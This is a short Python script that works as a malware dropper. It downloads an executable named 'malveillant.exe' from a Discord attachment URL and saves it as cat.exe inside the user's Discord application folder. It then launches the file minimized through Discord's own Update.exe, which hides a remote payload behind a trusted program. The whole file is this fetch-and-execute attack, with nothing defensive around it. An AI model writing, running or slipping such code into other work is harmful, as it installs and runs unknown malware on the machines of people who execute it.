import requests, subprocess, os

def main():
    file = requests.get("https://cdn.discordapp.com/attachments/941400716956799106/942268626843619348/malveillant.exe")
    open(f"C:/Users/{os.getlogin()}/AppData/Local/Discord/app-1.0.9003/cat.exe", 'wb').write(file.content)
    subprocess.run(f"C:/Users/{os.getlogin()}/AppData/Local/Discord/Update.exe --processStart cat.exe --start-minimized ", shell=True)


if __name__ == "__main__":
    main()